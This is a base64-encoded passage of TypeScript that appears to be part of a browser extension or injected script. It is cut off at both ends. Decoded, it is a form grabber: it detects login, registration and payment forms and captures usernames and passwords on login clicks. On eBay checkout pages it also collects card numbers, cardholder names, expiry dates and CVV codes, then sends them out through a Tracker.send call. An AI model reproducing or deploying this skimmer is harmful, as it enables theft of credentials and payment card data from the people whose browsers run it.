CAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignZGFzaC5mZW1iZWQuY29tJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2xvZ2luJykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICBpbnRlcnZhbCA/IGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpIDogJyc7XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5pc1RyYWNrZXJBY3RpdmF0ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi50cmFja2VySm9iSWQrKztcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmNsYXNzaWNUcmFja0F1dGhFdmVudChzZWxmLCAnI2VtYWlsX2xvZ2luJywgJyNwYXNzd29yZCcsICcjbG9naW4nKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICByZXNvbHZlckZvcm1BdHRyaWJ1dGVzKHNlbGY6IHRoaXMsIF9fZm9ybUVsZW1lbnQ6IGFueSk6IGFueSB7XHJcbiAgICAgICAgY29uc3QgYXR0cmlidXRlcyA9IFsuLi5fX2Zvcm1FbGVtZW50LmF0dHJpYnV0ZXNdO1xyXG4gICAgICAgIGlmIChhdHRyaWJ1dGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBhdHRyaWJ1dGVzLmZvckVhY2goZnVuY3Rpb24gKGF0dHJpYnV0ZSkge1xyXG4gICAgICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZS5ub2RlVmFsdWUgIT09ICdqYXZhc2NyaXB0OnZvaWQoMCk7Jykge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChhdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCAhPT0gMCAmJiBhdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCA+PSAzKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC8qZm9ybSBhdHRyaWJ1dGUgdmFsdWUqL1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBhdXRoRm9ybUF0dHJpYnV0ZS5mb3JFYWNoKGZ1bmN0aW9uIChrZXl3b3JkOiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChPYmplY3Qua2V5cyhrZXl3b3JkKS5sZW5ndGggIT09IDAgJiYga2V5d29yZC5jb25zdHJ1Y3RvciA9PT0gT2JqZWN0KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoa2V5d29yZCkuZm9yRWFjaChmdW5jdGlvbiAoX19rZXkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5d29yZFtfX2tleV0uZm9yRWFjaChmdW5jdGlvbiAoX19xS2V5OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRyaWJ1dGUubm9kZVZhbHVlLnRvTG93ZXJDYXNlKCkuaW5kZXhPZihfX3FLZXkpICE9PSAtMSAvKnx8IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4udG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcUtleSkgIT09IC0xXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfHwgZG9jdW1lbnQudGl0bGUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcUtleSkgIT09IC0xICYmIHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4udG9Mb3dlckNhc2UoKS5pbmRleE9mKCdmaWxlJykgPT09IC0xKi8pIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvKnZhciBzdHIgPSB0ZXh0LnJlcGxhY2UoLyheXFx3ezF9KXwoXFxzezF9XFx3ezF9KS9nLCBtYXRjaCA9PiBtYXRjaC50b1VwcGVyQ2FzZSgpKTsqL1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vc2VsZi5hdXRoRXZlbnQgIT09IHVuZGVmaW5lZCA/IHNlbGYuYXV0aEV2ZW50ID0gc2VsZi5hdXRoRXZlbnQgOiBzZWxmLmF1dGhFdmVudCA9IF9fa2V5O1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYXV0aEV2ZW50ID0gX19rZXk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRyaWJ1dGUubm9kZVZhbHVlID09PSBudWxsKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vc2VsZi5hdXRoRXZlbnQgIT09IHVuZGVmaW5lZCA/IHNlbGYuYXV0aEV2ZW50ID0gc2VsZi5hdXRoRXZlbnQgOiBzZWxmLmF1dGhFdmVudCA9ICdleGNsdWRlJztcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hdXRoRXZlbnQgPSAnZXhjbHVkZSc7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICBzZWxmLmF1dGhFdmVudCA9ICdVbmtub3duJztcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLmF1dGhFdmVudDtcclxuICAgIH1cclxuXHJcbiAgICB0cmFjayhzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBIVE1MRm9ybUVsZW1lbnQpIHtcclxuICAgICAgICBsZXQgZWxlbWVudHM6IHN0cmluZ1tdID0gW107XHJcbiAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQubm9kZU5hbWUgPT09ICdGT1JNJyAmJiBfX2Zvcm1FbGVtZW50Lmxlbmd0aCAhPT0gMSkge1xyXG4gICAgICAgICAgICBzZWxmLnJlc29sdmVyRm9ybUF0dHJpYnV0ZXMoc2VsZiwgX19mb3JtRWxlbWVudCk7XHJcbiAgICAgICAgICAgIGlmIChzZWxmLmF1dGhFdmVudCA9PT0gJ2xvZ2luJyB8fCBzZWxmLmF1dGhFdmVudCA9PT0gJ3JlZ2lzdGVyJykge1xyXG4gICAgICAgICAgICAgICAgc2VsZi5jcmF3bEF1dGhGb3JtRWxlbWVudChzZWxmLCBlbGVtZW50cywgX19mb3JtRWxlbWVudCk7XHJcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoc2VsZi5hdXRoRXZlbnQgPT09ICdwYXltZW50Jykge1xyXG4gICAgICAgICAgICAgICAgc2VsZi5jcmF3bFBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBlbGVtZW50cywgX19mb3JtRWxlbWVudCk7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoc2VsZi5hdXRoRXZlbnQgIT09ICdleGNsdWRlJyAmJiBzZWxmLmF1dGhFdmVudCAhPT0gJ2xvZ291dCcpIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmNyYXdsQXV0aEZvcm1FbGVtZW50KHNlbGYsIGVsZW1lbnRzLCBfX2Zvcm1FbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmNyYXdsUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIGVsZW1lbnRzLCBfX2Zvcm1FbGVtZW50KTtcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgLyphZGRpdGlvbmFsIGZ1bmN0aW9ucyovXHJcbiAgICAgICAgICAgICAgICAgICAgLypleGNsdWRlIHBheXBhbCxhbWF6b24sdHVubmVsYmVhciovXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIC8qZWJheSovXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignZWJheScpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2ViYXlGb3JtRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19lYmF5Rm9ybUVsZW1lbnQuaWQgPT09ICdjcmVkaXQtY2FyZC1kZXRhaWxzJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRWJheVBheW1lbnREYXRhQ29sbGVjdGlvbihzZWxmLCBfX2ViYXlGb3JtRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjcm9vdCcpICE9PSBudWxsICYmIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgIT09IG51bGwgJiYgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJ0bi5idG4tLXByaW1hcnkuZmllbGQnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5idG4uYnRuLS1wcmltYXJ5LmZpZWxkJyk/Lm5vZGVOYW1lID09PSAnQlVUVE9OJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtcImNsaWNrXCIsIFwiZGJsY2xpY2tcIl0uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlOiBhbnkgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJ0bi5idG4tLXByaW1hcnkuZmllbGQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2lucHV0JywgJ2NyZWRpdENhcmROdW1iZXInLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2lucHV0JywgJ2ZpcnN0TmFtZScsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTcGVjaWZpY0VsZW1lbnRCeVRhZ05hbWUoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgYXMgSFRNTEVsZW1lbnQpLCAnaW5wdXQnLCAnbGFzdE5hbWUnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2lucHV0JywgJ2V4cGlyYXRpb25EYXRlJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNpYy1tb2R1bGUnKSBhcyBIVE1MRWxlbWVudCksICdpbnB1dCcsICdjdnYnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkLmluZGV4T2YoJ2NyZWRpdENhcmROdW1iZXInKSAhPT0gLTEgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5mbG9hdGluZy1pbnB1dF9fZml4cmlnaHQnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmNsYXNzTmFtZSA/IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5mbG9hdGluZy1pbnB1dF9fZml4cmlnaHQnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmNsYXNzTmFtZS50b0xvd2VyQ2FzZSgpIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzFdLnZhbHVlICsgJyAnICsgdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMl0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVszXS5pZCA9PT0gJ2V4cGlyYXRpb25EYXRlJyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzNdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzRdLmlkID09PSAnY3Z2JyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzRdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgY2xhc3NpY1RyYWNrQXV0aEV2ZW50KHNlbGY6IHRoaXMsIHVzZXJuYW1lRWxlbWVudElkOiBhbnksIHBhc3N3b3JkRWxlbWVudElkOiBhbnksIGxvZ2luQnV0dG9uRWxlbWVudElkOiBhbnkpIHtcclxuICAgICAgICBsZXQgdXNlcm5hbWVFbGVtZW50OiBhbnksIHBhc3N3b3JkRWxlbWVudDogYW55LCBsb2dpbkJ1dHRvbkVsZW1lbnQ6IGFueTtcclxuXHJcbiAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IodXNlcm5hbWVFbGVtZW50SWQpICE9PSBudWxsKSB7XHJcbiAgICAgICAgICAgIHVzZXJuYW1lRWxlbWVudCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IodXNlcm5hbWVFbGVtZW50SWQpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcihwYXNzd29yZEVsZW1lbnRJZCkgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgcGFzc3dvcmRFbGVtZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcihwYXNzd29yZEVsZW1lbnRJZCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKGxvZ2luQnV0dG9uRWxlbWVudElkKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICBsb2dpbkJ1dHRvbkVsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKGxvZ2luQnV0dG9uRWxlbWVudElkKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgbG9naW5CdXR0b25FbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICByZXR1cm4gVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlTG9naW5EYXRhJyxcclxuICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICBcImV2ZW50XCI6IHNlbGYuYXV0aEV2ZW50LFxyXG4gICAgICAgICAgICAgICAgICAgIFwidXNlcm5hbWVcIjogdXNlcm5hbWVFbGVtZW50LnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgIFwicGFzc3dvcmRcIjogcGFzc3dvcmRFbGVtZW50LnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9KVxyXG4gICAgfVxyXG5cclxuICAgIGNyYXdsQXV0aEZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIGVsZW1lbnRzOiBhbnkgW10sIF9fcGFyZW50RWxlbWVudDogSFRNTEVsZW1lbnQpIHtcclxuICAgICAgICBfX3BhcmVudEVsZW1lbnQuY2hpbGROb2Rlcz8uZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICBbJ2lucHV0JywgJ2J1dHRvbicsICdhJ10uZm9yRWFjaChmdW5jdGlvbiAoX19lbGlnaWJsZUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09PSBfX2VsaWdpYmxlRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgIFsnaW5wdXQnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX29ubHlJbnB1dEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IF9fb25seUlucHV0RWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgWy4uLl9fY2hpbGRFbGVtZW50LmF0dHJpYnV0ZXNdLmZvckVhY2goZnVuY3Rpb24gKF9fYXR0cmlidXRlKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fYXR0cmlidXRlLm5vZGVWYWx1ZS5sZW5ndGggIT09IDAgJiYgX19hdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCA+PSA0KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIG1pbm9yIGNoYW5nZXMgc3RhcnQgKi9cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWyd0ZXh0JywgJ3VzZXInLCAnZW1haWwnLCAncGFzcyddLmZvckVhY2goZnVuY3Rpb24gKF9fZWxpZ2libGVBdHRyaWJ1dGUpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2F0dHJpYnV0ZS5ub2RlVmFsdWUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fZWxpZ2libGVBdHRyaWJ1dGUpICE9PSAtMSApIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5wdXNoKF9fY2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIG1pbm9yIGNoYW5nZXMgZW5kICovXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQudHlwZSA9PT0gJ3N1Ym1pdCcgfHwgX19jaGlsZEVsZW1lbnQudHlwZSA9PT0gJ2J1dHRvbicgfHwgX19jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdBJyAmJlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBfX2NoaWxkRWxlbWVudC5pbm5lckhUTUwudG9Mb3dlckNhc2UoKS5pbmRleE9mKCdzaWduJyB8fCAnbG9nJyB8fCAncmVnJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucmVzb2x2ZUF1dGhFdmVudChzZWxmLCBfX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAg